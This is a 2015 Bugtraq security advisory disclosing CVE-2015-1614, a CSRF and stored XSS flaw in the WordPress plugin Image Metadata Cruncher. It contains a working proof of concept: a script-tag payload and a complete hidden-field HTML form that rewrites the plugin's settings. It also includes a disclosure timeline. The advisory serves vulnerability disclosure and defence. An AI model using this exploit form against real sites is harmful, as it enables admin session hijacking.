
Date: Tue, 17 Feb 2015 03:32:16 GMT
From: kingkaustubh@...com
To: bugtraq@...urityfocus.com
Subject: CVE-2015-1614 csrf/xss in in wordpress Plugin Image Metadata cruncher

# Title: CSRF / Stored XSS Vulnerability in IMAGE-MEtadata-Cruncher Wordpress Plugin 
# Author: Kaustubh G. Padwad
# CVE-ID : CVE-2015-1614
# Plugin Homepage: https://wordpress.org/plugins/image-metadata-cruncher/
# Severity: Medium

# Description: 
# Vulnerable Parameter:  Alternate text,Caption,Custom image meta tags
# About Vulnerability: This plugin is vulnerable to a combination of CSRF/XSS attack meaning that if an admin user can be tricked to visit a crafted URL created by attacker (via spear phishing/social engineering), the attacker can insert arbitrary script into admin page. Once exploited, admin�s browser can be made to do almost anything the admin user could typically do by hijacking admin's cookies etc. 

# Vulnerability Class:     
https://www.owasp.org/index.php/Cross-Site_Request_Forgery_%28CSRF%29          
Cross Site Scripting (https://www.owasp.org/index.php/Top_10_2013-A3-Cross-Site_Scripting_(XSS)) 

# Steps to Reproduce: (POC):
After installing the plugin
Stored XSS: 
1.  Goto settings -> image metadata cruncher
2.  Paste this payload � �<script>alert("1")</script> � in either alternet text,caption,or Custom.
3.  once pasted it will popup the alert BOX ;)
4.  Visit settings page of this plugin anytime later and you can see the script executing as it is stored. 


# CSRF POC
This Plugin is also vulnerable for CSRF Attack also below is the POC for the same

<html>
  <body>
    <form action="http://localhost/wordpress/wp-admin/options.php" method="POST">
      <input type="hidden" name="option&#95;page" value="image&#95;metadata&#95;cruncher&#95;title" />
      <input type="hidden" name="action" value="update" />
      <input type="hidden" name="&#95;wpnonce" value="0061596f3e" />
      <input type="hidden" name="&#95;wp&#95;http&#95;referer" value="&#47;wordpress&#47;wp&#45;admin&#47;plugins&#46;php&#63;page&#61;image&#95;metadata&#95;cruncher&#45;options" />
      <input type="hidden" name="option&#95;page" value="image&#95;metadata&#95;cruncher&#95;alt" />
      <input type="hidden" name="action" value="update" />
      <input type="hidden" name="&#95;wpnonce" value="d3134676c2" />
      <input type="hidden" name="&#95;wp&#95;http&#95;referer" value="&#47;wordpress&#47;wp&#45;admin&#47;plugins&#46;php&#63;page&#61;image&#95;metadata&#95;cruncher&#45;options" />
      <input type="hidden" name="image&#95;metadata&#95;cruncher&#91;enable&#95;highlighting&#93;" value="enable" />
      <input type="hidden" name="image&#95;metadata&#95;cruncher&#91;title&#93;" value="&#123;&#32;IPTC&#58;Headline&#32;&#125;" />
      <input type="hidden" name="image&#95;metadata&#95;cruncher&#91;alt&#93;" value="&lt;script&gt;alert&#40;&quot;1&quot;&#41;&lt;&#47;script&gt;" />
      <input type="hidden" name="image&#95;metadata&#95;cruncher&#91;caption&#93;" value="alert&#40;&quot;1&quot;&#41;" />
      <input type="hidden" name="image&#95;metadata&#95;cruncher&#91;description&#93;" value="&#123;&#32;IPTC&#58;Caption&#32;&#124;&#32;EXIF&#58;ImageDescription&#32;&#125;" />
      <input type="hidden" name="submit" value="Save&#32;Changes" />
      <input type="submit" value="Submit request" />
    </form>
  </body>

Next time when u navigate to page you will see XSS in action cheers ;)

Mitigation: 
Developer will fix this in next realese.

# Disclosure: 
1-feb-2015 Repoerted to Developer
2-Feb-2015 Acknodlagement from Developer
8-feb-2015 Ask update from developer
13-feb-2015 Inform developer about Public discloser with confirmation of patching this in next realese
14-feb-2015 Inform to Bugtraq,Public Disclose
17-feb-2015 Reposting with cve and csrf POC

#credits:
Kaustubh Padwad
Information Security Researcher
kingkaustubh@...com
https://twitter.com/s3curityb3ast
http://breakthesec.com
https://www.linkedin.com/in/kaustubhpadwad

